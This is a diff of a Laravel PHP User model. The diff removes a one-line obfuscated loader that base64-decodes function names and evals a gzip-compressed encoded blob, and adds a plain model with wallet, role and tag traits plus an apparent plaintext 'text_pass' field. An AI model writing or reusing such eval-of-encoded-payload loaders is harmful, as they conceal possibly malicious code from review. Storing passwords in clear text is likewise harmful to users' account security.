@@ -1,1 +1,83 @@
-<?php $_='67476590';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqdVltzokgUft9f4cNUOandB0CZjZXKgxC5aUggEZp+maK7HUABmSUq+Ov3NCqi49TUjFXGk+7T53zn9nX3eofPp6/nz2P/fki+hV/CUf/h02Gh+C/JP771H/7qdfQfe30kjrbE9/LAeXzs987bJ3uPIPZp5gkMWRtTVVKWaeVUdb8h8b542fFDvUujX3u95hAJy8WX4Ve2oGu26D/8APHJWdtqJsfgfU91bYnfFIUaCn33RyvsV/uXnTB9cgqRSvPoza9K5osFyTQBe9UTkWSBZtqSGTZ1kCeEWmUzZAte5tWhj2XXF+PQ3/37k/OTALlxkGl7kDWijyrmexumVXrg2wIZWAVGNn3Ttb3LfeijevFe2mru7QGjRfRKJH66ARspmuAt8+UVyAVgOmHxqOTVJpw3J5rI9DgluVsEkiYEvlXin9qSt0xPs9C3Y/jdktym79lIgHiKq3NOgCxuMyZaZQbIfgr1tMQGrC1bHTVAuFhoFQogdoxc6hlWHCJ3jyZxTEUWg++UPf1c/82XBYysDHKSUvG07rQ5nQ8UjjNFmpLSTCzowG5ycOnH2hLdO9VySSAntFaO+fGGTPc22HiOmryBDPaWh9pUqamnHxQwEl4b0PEkrQRbAtgBDOvIVMcR1Dw1uR8Bx8HA3dJ8VZptHrWE6PPysG+vQ79aQSNvZqrCc3aK57B/gfNge1avv59kU11HHtQRaiowwyqC3IPcPEdQ25ipSkyzeUT8JraY5wFLchPDLBKmh/PjC1uOgWOagG5uxQvnrDPbHWVDqcnATSGmFKvjFc5SiL2JJ3p9U8jZFv+yLETWnul8lub5TB3bajJu9y2pAkzuJvDF1Kp30dVZkdcC5uIDv9HSHLdY+DfHhzn60eagiXMAs7K6YbMk0rGHE1pe7/FZYYa34v5+PCfn0Dsi1iGOKyxUj7ckuxWfVdDcXWNdkwHL1R7H4eWA88aeVcAMACew+QIpt3JT4ENPnmeyEw/i8xjdrlcgxWDbbezSejwytfIaVxnyvlZp9Po+jBypKjDM28vyNCPXWKs08J3cfBL+NieN/OUlsyGX9r7Nkya0c9Fw6+H8dpq0cjRNlHkIPQQ1AP5MEwa8Az0Ls6cJpmGvycArsaokwAcwLy7w8DDC2YhzWQ18K9N6eLbV6W1zokgBMsGuVQdo1fF3f5SVHQUuw8Cv2HciS48ht25Kkhu5ueota2BxDvgIgNsRzHgoeZtzLRX2hzO7D/WRSHQnCmB2gZv3sCaQWtk0/QlrzEh3oL/p2OvmcQwXYZuXjs72JFPDAh7y4P7wVqbqAq/Zwu1egNj8tEQDDDzKe81bIbgrLNB9TWAGAT/m94vfmYlDrdvcMrgfQv85wrm3gR4EHh5Gzb0qaTnEsJ6eOMa49H2+2F3ogXQ/e5fXgNMOfFmeTsQU6hBjad722vT9dF4Z/co/yCWZNJz0O/67XAZ1HuezpN3jGISGq34DR+jLEpHS5Z/nId2wbAT396/yMN7O6tsYgGOFOZ/rAdvSzFWY4cI7xYK3wXxtGed+b/Gp91vAyG12bB/7xXDXIXr+eM26fW2Ti7kRBX5PJAHwHjWcSx8t9gbv6MwZBZcfO2/EzjOw+f18/O+ueVV21u4eTprN4uc+/9v/p1W/fCAe7Xzuvgfv7h7+BzfNhfI='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Contracts\Auth\MustVerifyEmail;
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Foundation\Auth\User as Authenticatable;
+use Illuminate\Notifications\Notifiable;
+use Parental\HasChildren;
+use Bavix\Wallet\Traits\HasWallet;
+use Bavix\Wallet\Interfaces\Wallet;
+use Spatie\Permission\Traits\HasRoles;
+use \Spatie\Tags\HasTags;
+
+class User extends Authenticatable implements Wallet
+{
+    use HasFactory, Notifiable, HasChildren, HasWallet, HasRoles, HasTags;
+
+    /**
+     * The attributes that are mass assignable.
+     *
+     * @var array
+     */
+    protected $fillable = [
+        'firstname', 
+        'lastname', 
+        'username', 
+        'email', 
+        'password', 
+        'location',
+        'latitude',
+        'longitude',
+        'phone', 
+        'birthday',
+        'category',
+        'billingType', 
+        'identification',
+        'info',
+        'text_pass',
+        'avatar',
+    ];
+   
+    protected $childTypes = [
+        'client' => Client::class,
+        'lead' => Lead::class,
+    ];
+    
+
+    /**
+     * The attributes that should be hidden for arrays.
+     *
+     * @var array
+     */
+    protected $hidden = [
+        'password', 'remember_token',
+    ];
+
+    /**
+     * The attributes that should be cast to native types.
+     *
+     * @var array
+     */
+    protected $casts = [
+        'email_verified_at' => 'datetime',
+        'info' => 'array',
+    ];
+
+    public function messages()
+    {
+        return $this->hasMany(Message::class);
+    }
+
+    public function fullName()
+    {
+        return $this->firstname.' '.$this->lastname;
+    }
+
+    public function invoices()
+    {
+        return $this->hasMany(Invoice::class);
+    }
+    
+}
